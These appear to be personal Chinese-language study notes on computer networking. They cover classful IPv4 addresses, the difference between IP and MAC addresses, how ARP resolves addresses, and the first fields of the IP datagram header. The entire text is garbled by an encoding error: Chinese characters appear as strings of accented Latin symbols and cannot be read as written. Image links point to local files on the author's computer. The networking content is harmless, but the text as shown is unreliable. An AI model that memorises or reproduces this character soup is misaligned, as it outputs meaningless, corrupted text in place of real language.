æ‰€è°“åˆ†ç±»çš„IPåœ°å€æŒ‡çš„å°±æ˜¯å°†IPåœ°å€åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå›ºå®šç±»ï¼Œæ¯ä¸€ç±»åœ°å€éƒ½ç”±ä¸¤ä¸ªå›ºå®šé•¿åº¦çš„å­—æ®µç»„æˆï¼Œå…¶ä¸­ä¸€ä¸ªå­—æ®µæ˜¯ç½‘ç»œå·net-idï¼Œå®ƒæ ‡å¿—ä¸»æœºæ‰€è¿žæŽ¥åˆ°çš„ç½‘ç»œã€‚ä¸€ä¸ªç½‘ç»œå·åœ¨ä¸–ç•ŒèŒƒå›´å†…æ˜¯å”¯ä¸€çš„ã€‚å¦ä¸€ä¸ªå­—æ®µæ˜¯ä¸»æœºå·host-idï¼Œæ ‡å¿—è¯¥ä¸»æœºæˆ–è·¯ç”±å™¨ï¼Œåœ¨å…¶å‰é¢çš„ç½‘ç»œå·æ‰€æŒ‡æ˜Žçš„ç½‘ç»œèŒƒå›´å†…å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚å¯è§IPåœ°å€åœ¨æ•´ä¸ªäº’è”ç½‘èŒƒå›´å†…æ˜¯å”¯ä¸€çš„ã€‚ ![QQå›¾ç‰‡20200405162458](D:\My Daily\P\QQå›¾ç‰‡20200405162458.png) ABCä¸‰ç±»åœ°å€éƒ½æ˜¯å•æ’­åœ°å€(ä¸€å¯¹ä¸€é€šä¿¡)ï¼Œæœ€å¸¸ç”¨ã€‚ç½‘ç»œå·åˆ†åˆ«ä¸º1ï¼Œ2ï¼Œ3ä¸ªå­—èŠ‚é•¿ï¼Œä¸»æœºå·åˆ†åˆ«ä¸º3ï¼Œ2ï¼Œ1ä¸ªå­—èŠ‚é•¿ã€‚ IPåœ°å€ä¸ä»…ä»…æŒ‡æ˜Žä¸€å°ä¸»æœºï¼Œè¿˜æŒ‡æ˜Žäº†ä¸»æœºæ‰€è¿žæŽ¥åˆ°çš„ç½‘ç»œã€‚é€šå¸¸ç”¨ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºã€‚ å¸¸ç”¨çš„ä¸‰ç§ç±»åˆ«çš„IPåœ°å€ï¼šAç±»åœ°å€çš„ç½‘ç»œå·å­—æ®µå 1ä¸ªå­—èŠ‚ï¼Œæœ‰ä¸ƒä½å¯ä»¥ä½¿ç”¨ï¼Œä½†å¯ä»¥æŒ‡æ´¾çš„ç½‘ç»œå·ä¸º126ä¸ªï¼Œå…¶ä¸€æ˜¯ç½‘ç»œå·å­—æ®µå…¨ä¸º0è¡¨ç¤ºçš„IPåœ°å€æ˜¯ä¸ªä¿ç•™åœ°å€ï¼Œæ„æ€æ˜¯æœ¬ç½‘ç»œã€‚ç½‘ç»œå·127ä¿ç•™ä½œä¸ºæœ¬åœ°è½¯ä»¶çŽ¯å›žæµ‹è¯•æœ¬ä¸»æœºè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä¹‹ç”¨ã€‚è‹¥ä¸»æœºå‘é€ä¸€ä¸ªç›®çš„åœ°å€ä¸ºçŽ¯å›žåœ°å€çš„IPæ•°æ®æŠ¥ï¼Œåˆ™æœ¬é›†ä¸­çš„åè®®è½¯ä»¶å°±å¤„ç†æ•°æ®æŠ¥ä¸­çš„æ•°æ®ï¼Œè€Œä¸ä¼šæŠŠæ•°æ®æŠ¥å‘é€åˆ°ä»»ä½•ç½‘ç»œï¼Œç½‘ç»œå·ä¸º127çš„åœ°å€æ ¹æœ¬ä¸æ˜¯ä¸€ä¸ªç½‘ç»œåœ°å€ã€‚ Aç±»åœ°å€çš„ä¸»æœºå·å ä¸‰ä¸ªå­—èŠ‚ï¼Œæ¯ä¸€ä¸ªAç±»ç½‘ç»œä¸­çš„æœ€å¤§ä¸»æœºæ•°æ˜¯2Â²â´-2.å‡äºŒçš„åŽŸå› æ˜¯ï¼šå…¨é›¶çš„ä¸»æœºå·å­—æ®µè¡¨ç¤ºè¯¥IPåœ°å€æ˜¯æœ¬ä¸»æœºæ‰€è¿žæŽ¥é“å¾·å•ä¸ªç½‘ç»œåœ°å€ï¼Œå¦‚ä¸€ä¸»æœºçš„IPæ˜¯4.X.X.X,åˆ™è¯¥ä¸»æœºæ‰€åœ¨çš„ç½‘ç»œåœ°å€å°±æ˜¯4.0.0.0.è€Œå…¨1è¡¨ç¤ºæ‰€æœ‰çš„ï¼Œå³å…¨1çš„ä¸»æœºå·å­—æ®µè¡¨ç¤ºè¯¥ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºã€‚Aç±»åœ°å€å æ‰€æœ‰IPåœ°å€çš„ä¸€åŠã€‚ Bç±»åœ°å€çš„ç½‘ç»œå·å­—æ®µæœ‰ä¸¤ä¸ªå­—èŠ‚ï¼Œå‰2ä½å›ºå®šæ‰€ä»¥åªå‰©ä¸‹14ä½å¯ä»¥ä½¿ç”¨ã€‚ä¸å­˜åœ¨æ•´ä¸ªä¸¤å­—èŠ‚ç½‘ç»œå·å­—æ®µå…¨ä¸º0æˆ–1çš„çŠ¶å†µï¼Œä½†æ˜¯å®žé™…ä¸ŠBç±»ç½‘ç»œåœ°å€128.0.0.0æ˜¯ä¸æŒ‡æ´¾çš„ï¼Œå¯ä»¥æŒ‡æ´¾çš„æœ€å°ç½‘ç»œåœ°å€æ˜¯128.1.0.0ï¼Œå› æ­¤Bç±»ç½‘ç»œåœ°å€å¯æŒ‡æ´¾çš„ç½‘ç»œæ•°ä¸º2Â¹â´-1Bç±»åœ°å€æ¯ä¸€ä¸ªç½‘ç»œä¸Šçš„æœ€å¤§ä¸»æœºæ•°æ˜¯2Â¹â¶-2å³65534ï¼Œå‡äºŒä¹Ÿæ˜¯åŽ»é™¤å…¨0ä¸Žå…¨1.Bç±»å æ€»IPåœ°å€æ•° 25%ã€‚ Cç±»åœ°å€æœ‰3ä¸ªå­—èŠ‚çš„ç½‘ç»œå·å­—æ®µï¼Œå‰3ä½110ï¼Œå‰©ä¸‹21ä½è¿›è¡Œåˆ†é…ã€‚Cç±»åœ°å€192.0.0.0ä¹Ÿæ˜¯ä¸æŒ‡æ´¾çš„ï¼Œå¯ä»¥æŒ‡æ´¾çš„Cç±»æœ€å°ç½‘ç»œåœ°å€æ˜¯192.0.1.0ï¼Œæ˜“çŸ¥Cç±»åœ°å€å¯æŒ‡æ´¾çš„ç½‘ç»œæ€»æ•°å2Â²Â¹-1ï¼Œæ¯ä¸€ä¸ªCç±»åœ°å€çš„æœ€å¤§ä¸»æœºæ•°æ˜¯2â¸-2ã€‚æ•´ä¸ªCç±»åœ°å€ç©ºé—´å…±çº¦æœ‰2Â²â¹ä¸ªï¼Œå æ€»IPåœ°å€çš„å…«åˆ†ä¹‹ä¸€ã€‚ ![QQå›¾ç‰‡20200427144101](D:\My Daily\P\QQå›¾ç‰‡20200427144101.png) IPåœ°å€çš„ç‰¹ç‚¹ï¼š æ¯ä¸ªIPåœ°å€éƒ½ç”±ç½‘ç»œå·å’Œä¸»æœºå·ç»„æˆï¼Œä»Žè¿™ä¸ªæ„ä¹‰ä¸Šè¯´å®ƒæ˜¯åˆ†ç­‰çº§çš„åœ°å€ç»“æž„ã€‚åˆ†çº§çš„å¥½å¤„åœ¨äºŽIPåœ°å€ç®¡ç†æœºæž„åœ¨åˆ†é…IPæ—¶åªåˆ†é…ç½‘ç»œå·ï¼Œè€Œä¸»æœºå·åˆ™ç”±å¾—åˆ°è¯¥ç½‘ç»œå·çš„å•ä½è‡ªè¡Œåˆ†é…ã€‚å¹¶ä¸”è·¯ç”±å™¨ä»…æ ¹æ®ç›®çš„ä¸»æœºæ‰€è¿žæŽ¥çš„ç½‘ç»œå·æ¥è½¬å‘åˆ†ç»„è€Œä¸è€ƒè™‘ä¸»æœºå·ï¼Œè¿™æ ·å¯ä»¥ä½¿è·¯ç”±è¡¨ä¸­çš„é¡¹ç›®æ•°å¤§å¹…å‡å°‘ä»Žè€Œå‡å°‘è·¯ç”±è¡¨æ‰€å çš„å­˜å‚¨ç©ºé—´ä»¥åŠæŸ¥æ‰¾è·¯ç”±è¡¨æ—¶é—´ã€‚ å®žé™…ä¸ŠIPåœ°å€æ˜¯æ ‡å¿—ä¸€å°ä¸»æœº/è·¯ç”±å™¨å’Œä¸€æ¡é“¾è·¯çš„æŽ¥å£ã€‚å½“ä¸€å°ä¸»æœºåŒæ—¶è¿žæŽ¥åˆ°ä¸¤ä¸ªç½‘ç»œä¸Šæ—¶ï¼Œè¯¥ä¸»æœºå°±å¿…é¡»åŒæ—¶å…·æœ‰ä¸¤ä¸ªç›¸åº”çš„IPåœ°å€ï¼Œå…¶ç½‘ç»œå·å¿…é¡»æ˜¯ä¸åŒçš„ï¼ˆä¸Žè·¯ç”±å™¨è½¬å‘åˆ†ç»„åªçœ‹ç½‘ç»œå·æœ‰å…³ï¼‰ï¼Œè¿™ç§ä¸»æœºç§°ä¸ºå¤šå½’å±žä¸»æœºmultihomed hostã€‚ç”±äºŽä¸€ä¸ªè·¯ç”±å™¨è‡³å°‘è¿žæŽ¥åˆ°ä¸¤ä¸ªç½‘ç»œï¼Œå› æ­¤ä¸€ä¸ªè·¯ç”±å™¨è‡³å°‘åº”å½“æœ‰ä¸¤ä¸ªä¸åŒçš„IPåœ°å€ã€‚è·¯ç”±å™¨çš„ç­ä¸€ä¸ªæŽ¥å£éƒ½æœ‰ä»¥æ¶æžä¸åŒçš„IPåœ°å€ã€‚ ä¸€ä¸ªç½‘ç»œæ˜¯æŒ‡å…·æœ‰ç›¸åŒç½‘ç»œå·net-idçš„é›†åˆï¼Œæ‰€ä»¥ç”¨è½¬å‘å™¨æˆ–ç½‘æ¡¥è¿žæŽ¥èµ·æ¥çš„è‹¥å¹²ä¸ªå±€åŸŸç½‘ä»ç„¶ä¸ºä¸€ä¸ªç½‘ç»œã€‚ä¸åŒç½‘ç»œå·çš„å±€åŸŸç½‘å¿…é¡»ä½¿ç”¨è·¯ç”±å™¨è¿›è¡Œäº’è¿žã€‚ åœ¨IPåœ°å€ä¸­ï¼Œæ‰€æœ‰è¢«åˆ†é…åˆ°ç½‘ç»œå·çš„ç½‘ç»œéƒ½æ˜¯å¹³ç­‰çš„ï¼Œå³äº’è”ç½‘å¹³ç­‰å¯¹å¾…æ¯ä¸€ä¸ªIPåœ°å€ã€‚ å½“ä¸¤ä¸ªè·¯ç”±å™¨ç›´æŽ¥ç›¸è¿žï¼Œåœ¨è¿žçº¿ä¸¤ç«¯çš„æŽ¥å£å¤„ï¼Œå¯ä»¥åˆ†é…ä¹Ÿå¯ä»¥ä¸åˆ†é…IPåœ°å€ã€‚å¦‚åˆ†é…åˆ™è¿™ä¸€æ®µè¿žçº¿æž„æˆäº†ä¸€ç§åªåŒ…å«ä¸€æ®µçº¿è·¯çš„ç‰¹æ®Šç½‘ç»œï¼Œç§°ä¸ºæ— ç¼–å·ç½‘ç»œ/æ— åç½‘ç»œã€‚çŽ°åœ¨ä¸ºäº†èŠ‚çœèµ„æºå¸¸å¸¸ä¸åˆ†é…IPåœ°å€ã€‚ IPåœ°å€ä¸Žç¡¬ä»¶åœ°å€ä¸»æœºçš„IPåœ°å€ä¸Žç¡¬ä»¶åœ°å€çš„åŒºåˆ«:ä»Žå±‚æ¬¡çš„è§’åº¦ä¸Šçœ‹ï¼Œç‰©ç†åœ°å€æ˜¯æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚ä½¿ç”¨çš„åœ°å€ï¼Œè€ŒIPåœ°å€æ˜¯ç½‘ç»œå±‚å’Œä»¥ä¸Šå„å±‚ä½¿ç”¨çš„åœ°å€ï¼Œæ˜¯ä¸€ç§é€»è¾‘åœ°å€ã€‚ åœ¨å±€åŸŸç½‘ä¸­ï¼Œç”±äºŽç¡¬ä»¶å±‚åœ°å€å·²ç»å›ºåŒ–åœ¨ç½‘å¡ä¸Šçš„ROMä¸­ï¼Œå› æ­¤å¸¸å¸¸å°†ç¡¬ä»¶åœ°å€ç§°ä¸ºç‰©ç†åœ°å€ã€‚å› ä¸ºåœ¨å±€åŸŸç½‘çš„MACå¸§ä¸­çš„æºåœ°å€ä¸Žç›®çš„åœ°å€éƒ½æ˜¯ç¡¬ä»¶åœ°å€ï¼Œæ•…åˆç§°MACåœ°å€ã€‚ ![QQå›¾ç‰‡20200427151103](D:\My Daily\P\QQå›¾ç‰‡20200427151103.png) åœ¨å‘é€æ•°æ®æ—¶ï¼Œæ•°æ®ä»Žé«˜å±‚ä¸‹åˆ°ä½Žå±‚ï¼Œæœ€åŽæ‰åˆ°é€šä¿¡é“¾è·¯ä¸Šä¼ è¾“ï¼Œä½¿ç”¨IPåœ°å€çš„IPæ•°æ®æŠ¥ä¸€äº¤ç»™æ•°æ®é“¾è·¯å±‚å°±è¢«å°è£…æˆMACå¸§ã€‚è¿žæŽ¥åœ¨é€šä¿¡é“¾è·¯ä¸Šçš„çš„è®¾å¤‡å¦‚ä¸»æœº/è·¯ç”±å™¨ï¼Œåœ¨æ”¶åˆ°MACå¸§æ—¶ï¼Œæ ¹æ®MACå¸§é¦–éƒ¨ä¸­çš„ç¡¬ä»¶åœ°å€å†³å®šæ”¶ä¸‹æˆ–ä¸¢å¼ƒã€‚åªæœ‰åœ¨å‰¥åŽ»MACå¸§çš„é¦–éƒ¨å°¾éƒ¨åŽï¼ŒæŠŠMACå±‚æ•°æ®äº¤ç»™ç½‘ç»œå±‚åŽï¼Œç½‘ç»œå±‚æ‰èƒ½åœ¨IPæ•°æ®æŠ¥çš„çš„é¦–éƒ¨ä¸­æ‰¾åˆ°æºIPåœ°å€ä¸Žç›®çš„åœ°å€ã€‚ æ€»ä¹‹ï¼ŒIPåœ°å€æ”¾åœ¨IPæ•°æ®æŠ¥çš„é¦–éƒ¨ï¼Œè€Œç¡¬ä»¶åœ°å€æ”¾åœ¨MACå¸§é¦–éƒ¨ã€‚ç½‘ç»œå±‚å’Œç½‘ç»œå±‚ä»¥ä¸Šä½¿ç”¨IPåœ°å€ï¼Œæ•°æ®é“¾è·¯å±‚åŠä»¥ä¸‹ä½¿ç”¨ç¡¬ä»¶åœ°å€ã€‚IPå±‚ä¸Šå¯ä»¥çœ‹ä½œç”±IPç»„æˆçš„è™šæ‹Ÿäº’è”ç½‘ï¼Œå…·ä½“å®žçŽ°ç”¨åˆ°äº†MACåœ°å€ã€‚ é‡è¦çš„å‡ ç‚¹ï¼šåœ¨IPå±‚æŠ½è±¡çš„äº’è”ç½‘ä¸Šåªèƒ½çœ‹è§IPæ•°æ®æŠ¥ï¼Œå³ä½¿IPæ•°æ®æŠ¥è¦ç»è¿‡è·¯ç”±å™¨çš„ä¸¤æ¬¡è½¬å‘ï¼Œä½†æ˜¯åœ¨å®ƒé¦–éƒ¨ä¸­çš„æºåœ°å€å’Œç›®çš„åœ°å€å§‹ç»ˆåˆ†åˆ«ä¸ºIP1ä¸ŽIP2ï¼Œä¸­é—´ç»è¿‡çš„è·¯ç”±å™¨IPåœ°å€å¹¶ä¸åŒ…å«ã€‚/è™½ç„¶IPæ•°æ®æŠ¥çš„é¦–éƒ¨æœ‰æºç«™IPåœ°å€ï¼Œä½†æ˜¯è·¯ç”±å™¨åªæ ¹æ®ç›®çš„ç«™IPåœ°å€è¿›è¡Œè·¯ç”±é€‰æ‹©ï¼ˆåºŸè¯ï¼Œä¸ç„¶æ ¹æ®ä»€ä¹ˆï¼Ÿï¼‰/åœ¨æ•°æ®é“¾è·¯å±‚åªèƒ½çœ‹è§MACå¸§ï¼ŒIPæ•°æ®æŠ¥è¢«å°è£…åœ¨MACå¸§ä¸­ï¼ŒMACå¸§åœ¨ä¸åŒç½‘ç»œä¸Šä¼ é€æ—¶ï¼Œå…¶MACé¦–åœ°å€å’Œæºåœ°å€è¦å‘ç”Ÿå˜åŒ–ã€‚ä¾‹å¦‚ä»ŽH1ä¼ åˆ°R1æ—¶ï¼Œå…¶MACå¸§é¦–éƒ¨ä¸­å†™çš„æ˜¯ä»Žç¡¬ä»¶åœ°å€HA1å‘é€åˆ°R1çš„ç¡¬ä»¶åœ°å€H3ï¼ŒR1è·¯ç”±å™¨æ”¶åˆ°MACå¸§åŽï¼Œåœ¨æ•°æ®é“¾è·¯å±‚ä¸¢å¼ƒåŽŸæ¥MACå¸§çš„é¦–éƒ¨å°¾éƒ¨ï¼Œå¹¶æ·»ä¸Šæ–°çš„é¦–éƒ¨å°¾éƒ¨è¿›è¡Œè½¬å‘ã€‚/å°½ç®¡äº’è”åœ¨ä¸€èµ·çš„ç½‘ç»œçš„ç¡¬ä»¶åœ°å€ä½“ç³»å„ä¸åŒï¼Œä½†æ˜¯IPå±‚æŠ½è±¡çš„äº’è”ç½‘å±è”½äº†ä¸‹å±‚çš„å¤æ‚ç»†èŠ‚ã€‚åªè¦åœ¨ç½‘ç»œå±‚è®¨è®ºé—®é¢˜ï¼Œå°±èƒ½ä½¿ç»Ÿä¸€æŠ½è±¡çš„IPåœ°å€ç ”ç©¶ä¸»æœºå’Œä¸»æœº/è·¯ç”±é—´çš„é€šä¿¡ã€‚ åœ°å€è§£æžåè®®ARPï¼šä¸»æœºå’Œè·¯ç”±å™¨æ€Žä¹ˆçŸ¥é“åº”å½“åœ¨MACå¸§çš„é¦–éƒ¨å¡«ä¸Šä»€ä¹ˆæ ·çš„ç¡¬ä»¶åœ°å€ï¼Ÿå·²ç»çŸ¥é“äº†ä¸€ä¸ªä¸»æœº/è·¯ç”±å™¨çš„IPåœ°å€ï¼Œå¦‚ä½•æ‰¾å‡ºå…¶ç›¸åº”çš„ç¡¬ä»¶åœ°å€ï¼ŸARPå°±æ˜¯ç”¨æ¥è§£å†³æ­¤é—®é¢˜çš„ã€‚ ![QQå›¾ç‰‡20200429142619](D:\My Daily\P\QQå›¾ç‰‡20200429142619.png) ARPåè®®çš„ç”¨é€”æ˜¯ä»Žç½‘ç»œå±‚ä½¿ç”¨çš„IPåœ°å€è§£æžå‡ºæ•°æ®é“¾è·¯å±‚ä½¿ç”¨çš„ç‰©ç†åœ°å€ã€‚ç”±äºŽåœ¨å®žé™…çš„ç½‘ç»œä¸Šä¼ è¾“æ•°æ®å¸§æ—¶ï¼Œå¿…é¡»ä½¿ç”¨è¯¥ç½‘ç»œçš„ç¡¬ä»¶åœ°å€ã€‚ä½†IPåœ°å€å’Œç¡¬ä»¶åœ°å€é—´ç”±äºŽæ ¼å¼ä¸åŒå¹¶ä¸æ˜¯ç®€å•çš„æ˜ å°„å…³ç³»ã€‚æ­¤å¤–ï¼Œåœ¨ä¸€ä¸ªç½‘ç»œä¸Šå¯èƒ½ä¼šæœ‰ä¸»æœºçš„åŠ å…¥ä¸Žé€€å‡ºï¼ŒåŒæ—¶æ›´æ¢ç½‘ç»œé€‚é…å™¨ä¹Ÿä¼šä½¿ä¸»æœºçš„ç¡¬ä»¶åœ°å€æ”¹å˜ã€‚ARPåè®®å¯ä»¥åœ¨ä¸»æœºARPé«˜é€Ÿç¼“å­˜ä¸­å­˜æ”¾ä¸€ä¸ªä»ŽIPåœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„è¡¨ï¼Œå¹¶ä¸”è¿™ä¸ªæ˜ å°„è¡¨ç»å¸¸åŠ¨æ€æ›´æ–°ã€‚ æ¯ä¸€å°ä¸»æœºéƒ½æœ‰ä¸€ä¸ªARPé«˜é€Ÿç¼“å­˜ï¼ˆARP cacheï¼‰ï¼Œé‡Œé¢æœ‰æœ¬å±€åŸŸç½‘ä¸Šçš„å„ä¸»æœºå’Œè·¯ç”±å™¨çš„IPåœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„è¡¨ï¼Œè¿™äº›éƒ½æ˜¯è¯¥ä¸»æœºç›®å‰çŸ¥é“çš„ä¸€äº›åœ°å€ã€‚ ARPèŽ·å–æ–°åœ°å€çš„è¿‡ç¨‹ï¼šå½“ä¸»æœºAè¦å‘æœ¬å±€åŸŸç½‘ä¸ŠæŸå°ä¸»æœºBå‘é€IPæ•°æ®æŠ¥æ—¶ï¼Œå…ˆåœ¨å…¶ARPé«˜é€Ÿç¼“å­˜ä¸­æŸ¥çœ‹æœ‰æ— ä¸»æœºBçš„IPåœ°å€ã€‚è‹¥æœ‰ï¼Œå°±åœ¨ARPé«˜é€Ÿç¼“å­˜ä¸­æŸ¥å‡ºå…¶å¯¹åº”çš„ç¡¬ä»¶åœ°å€ï¼Œå†æŠŠè¿™ä¸ªç¡¬ä»¶åœ°å€å†™å…¥MACå¸§ã€‚ è‹¥æ— ï¼Œå¯èƒ½æ˜¯ä¸»æœºBåˆšå…¥ç½‘ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸»æœºAåˆšåŠ ç”µï¼Œå…¶é«˜é€Ÿç¼“å­˜è¿˜æ˜¯ç©ºçš„ã€‚æŒ‰ç…§å¦‚ä¸‹æ­¥éª¤æ·»åŠ MACåœ°å€ï¼š ARPè¿›ç¨‹åœ¨æœ¬å±€åŸŸç½‘ä¸Šå‘é€ä¸€ä¸ªARPè¯·æ±‚åˆ†ç»„ï¼Œå…¶ä¸­æœ‰ä¸»æœºAçš„IPåœ°å€ï¼Œç¡¬ä»¶åœ°å€ï¼Œè¯·æ±‚IPåœ°å€ä¸ºX.X.X.Xä¸»æœºçš„ç¡¬ä»¶åœ°å€ã€‚ åœ¨æœ¬å±€åŸŸç½‘ä¸Šçš„æ‰€æœ‰ä¸»æœºä¸Šè¿è¡Œçš„ARPè¿›ç¨‹éƒ½æ”¶åˆ°æ­¤ARPè¯·æ±‚åˆ†ç»„ã€‚ ä¸»æœºBçš„IPåœ°å€ä¸ŽARPè¯·æ±‚åˆ†ç»„ä¸­è¦æŸ¥è¯¢çš„IPåœ°å€ä¸€è‡´ï¼Œå³æ”¶ä¸‹è¯¥è¯·æ±‚åˆ†ç»„ï¼Œå¹¶å‘ä¸»æœºAå‘é€ARPå“åº”åˆ†ç»„ï¼ŒåŒæ—¶åœ¨è¯¥å“åº”åˆ†ç»„ä¸­å†™å…¥å…¶ç¡¬ä»¶åœ°å€ã€‚æ³¨æ„ARPè¯·æ±‚åˆ†ç»„æ˜¯å¹¿æ’­ï¼Œè€ŒARPå“åº”åˆ†ç»„æ˜¯å•æ’­ï¼Œå³ä»Žä¸€ä¸ªæºåœ°å€å‘é€åˆ°ä¸€ä¸ªç›®çš„åœ°å€ã€‚ å½“ä¸»æœºAæ”¶åˆ°Bçš„ARPå“åº”åˆ†ç»„åŽï¼Œå°±åœ¨å…¶ARPé«˜é€Ÿç¼“å­˜ä¸­å†™å…¥ä¸»æœºBçš„IPåœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„ã€‚ ARPé«˜é€Ÿç¼“å­˜å°†å·²å¾—åˆ°çš„åœ°å€æ˜ å°„ä¿å­˜åœ¨é«˜é€Ÿç¼“å­˜ä¸­ï¼Œè¿™å°±ä½¿å¾—è¯¥ä¸»æœºä¸‹æ¬¡å†å’Œå…·æœ‰åŒæ ·ç›®çš„åœ°å€çš„ä¸»æœºé€šä¿¡æ—¶ï¼Œå¯ä»¥ç›´æŽ¥ä»Žé«˜é€Ÿç¼“å­˜ä¸­æ‰¾åˆ°æ‰€éœ€çš„ç¡¬ä»¶åœ°å€è€Œä¸å¿…å†ä½¿ç”¨å¹¿æ’­çš„æ–¹å¼å‘é€ã€‚ ARPå¯¹ä¿å­˜åœ¨é«˜é€Ÿç¼“å­˜ä¸­çš„æ¯ä¸€ä¸ªæ˜ å°„åœ°å€é¡¹ç›®éƒ½è®¾ç½®ç”Ÿå­˜æ—¶é—´ï¼Œé€šå¸¸ä¸º10-20minã€‚åŠæ—¶æ›´æ–°å…¶ä¸­çš„é¡¹ç›®ï¼Œå°†å·²ç»å¤±æ•ˆçš„æ˜ å°„åœ°å€é¡¹ç›®å¤„ç†æŽ‰ï¼Œé€šä¿¡æ—¶é‡æ–°å¹¿æ’­ARPè¯·æ±‚ï¼Œé¿å…å‡ºçŽ°é”™è¯¯ã€‚ æ³¨æ„ARPæ˜¯è§£å†³åŒä¸€ä¸ªå±€åŸŸç½‘ä¸Šçš„ä¸»æœºæˆ–è·¯ç”±å™¨çš„IPåœ°å€æ˜ å°„é—®é¢˜ï¼Œå½“åœ¨ä¸åŒå±€åŸŸç½‘ä¸Šé€šä¿¡æ—¶ï¼Œä½¿ç”¨è·¯ç”±å™¨ä½œä¸ºåª’ä»‹ï¼šä¸»æœºAä¼ åˆ°R1ï¼ŒR1é€šè¿‡è½¬å‘è¡¨æ‰¾åˆ°ä¸‹ä¸€è·³è·¯ç”±å™¨R2ï¼ŒåŒæ—¶ä½¿ç”¨ARPæ‰¾å‡ºR2ç¡¬ä»¶åœ°å€ï¼ŒR2æŽ¥æ”¶åŽä½¿ç”¨ç±»ä¼¼æ–¹æ³•è§£æžå‡ºç›®çš„ä¸»æœºBçš„ç¡¬ä»¶åœ°å€ï¼Œæœ€ç»ˆäº¤ä»˜ã€‚ æ—¢ç„¶åœ¨ç½‘ç»œé“¾è·¯ä¸Šä¼ è¾“çš„å¸§æœ€ç»ˆæ˜¯æŒ‰ç…§ç¡¬ä»¶åœ°å€æ‰¾åˆ°ç›®çš„ä¸»æœºçš„ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜è¦ä½¿ç”¨IPåœ°å€ï¼Ÿå…¨ä¸–ç•Œå­˜åœ¨ç€å„ç§å„æ ·çš„ç½‘ç»œï¼Œä½¿ç”¨ç€ä¸åŒçš„ç¡¬ä»¶åœ°å€ã€‚è¦ä½¿è¿™äº›å¼‚æž„ç½‘ç»œèƒ½å¤Ÿç›¸äº’é€šä¿¡å°±å¿…é¡»è¿›è¡Œéžå¸¸å¤æ‚çš„ç¡¬ä»¶åœ°å€è½¬æ¢å·¥ä½œï¼Œè€Œç”±ç”¨æˆ·/ç”¨æˆ·ä¸»æœºå®Œæˆè¿™é¡¹å·¥ä½œæ˜¯ä¸å¯èƒ½çš„ã€‚IPåœ°å€ç¼–ç å°†é€šä¿¡å˜å¾—åƒæ˜¯è¿žæŽ¥åœ¨ä¸€ä¸ªç½‘ç»œä¸Šä¸€æ ·æ–¹ä¾¿ã€‚ IPæ•°æ®æŠ¥çš„æ ¼å¼åœ¨TCP/IPçš„æ ‡å‡†ä¸­ï¼Œå„ç§æ•°æ®æ ¼å¼å¸¸å¸¸ä»¥32ä½å³4å­—èŠ‚æ¥æè¿°ã€‚ ![QQå›¾ç‰‡20200429151754](D:\My Daily\P\QQå›¾ç‰‡20200429151754.png) ä¸€ä¸ªIPæ•°æ®æŠ¥ç”±é¦–éƒ¨ä¸Žæ•°æ®ä¸¤éƒ¨åˆ†æž„æˆï¼Œé¦–éƒ¨çš„å‰ä¸€éƒ¨åˆ†æ˜¯å›ºå®šé•¿åº¦å…±20å­—èŠ‚ï¼Œæ‰€æœ‰IPæ•°æ®æŠ¥å¿…é¡»å…·æœ‰ã€‚ ç‰ˆæœ¬ï¼šå 4ä½ï¼ŒIPåè®®ç‰ˆæœ¬ï¼ŒIPV4/IPV6ï¼Œé€šä¿¡åŒæ–¹ä½¿ç”¨çš„ç‰ˆæœ¬è¦ä¸€è‡´ã€‚ é¦–éƒ¨é•¿åº¦ï¼šå 4ä½ï¼Œå¯è¡¨ç¤ºçš„æœ€å¤§åè¿›åˆ¶æ•°ä¸º15ï¼Œå•ä½ä¸º32ä½å³4å­—èŠ‚ã€‚æ‰€ä»¥é¦–éƒ¨é•¿åº¦æœ€å¤§ä¸º60å­—èŠ‚ã€‚æœ€å°å€¼ä¸º5ï¼Œå›ºå®šé•¿åº¦ã€‚é•¿åº¦ä¸æ˜¯4å­—èŠ‚æ•´æ•°å€æ—¶è‡ªåŠ¨å¡«å……ï¼Œç¡®ä¿æ•°æ®éƒ¨åˆ†åœ¨4å­—èŠ‚æ•´æ•°å€å¼€å§‹ï¼Œå®žçŽ°IPåè®®æ—¶æ¯”è¾ƒæ–¹ä¾¿ã€‚ åŒºåˆ†æœåŠ¡ï¼šå 8ä½ï¼Œç”¨æ¥èŽ·å¾—æ›´å¥½çš„æœåŠ¡ï¼Ÿï¼Ÿï¼Ÿï¼Ÿä¸€èˆ¬æƒ…å†µä¸‹æ²¡æœ‰ç”¨ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ æ€»é•¿åº¦ï¼šå 16ä½ï¼Œé¦–éƒ¨å’Œæ•°æ®ä¹‹å’Œçš„é•¿åº¦ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œæ€»é•¿åº¦å­—æ®µä¸º16ä½ã€‚IPå±‚ä¸‹é¢çš„æ¯ä¸€ç§æ•°æ®é“¾è·¯å±‚åè®®éƒ½è§„å®šäº†ä¸€ä¸ªæ•°æ®å¸§ä¸­æ•°æ®å­—æ®µçš„æœ€å¤§é•¿åº¦ï¼Œç§°ä¸ºæœ€å¤§ä¼ é€å•å…ƒMTUã€‚å½“ä¸€ä¸ªIPæ•°æ®æŠ¥å°è£…æˆé“¾è·¯å±‚çš„å¸§æ—¶ï¼Œéœ€è¦å‘ä¸‹å…¼å®¹ï¼Œä¸èƒ½è¶…è¿‡ä¸‹é¢æ•°æ®é“¾è·¯å±‚æ‰€è§„å®šçš„MTUå€¼ï¼Œå¦åˆ™ä¼šè¢«è¿›è¡Œåˆ†ç‰‡å¤„ç†ã€‚è¿›è¡Œåˆ†ç‰‡æ—¶ï¼Œæ€»é•¿åº¦å­—æ®µæ˜¯æŒ‡åˆ†ç‰‡åŽçš„æ¯ä¸€ä¸ªåˆ†ç‰‡é¦–éƒ¨é•¿åº¦ä¸Žè¯¥åˆ†ç‰‡æ•°æ®é•¿åº¦æ€»å’Œã€‚ 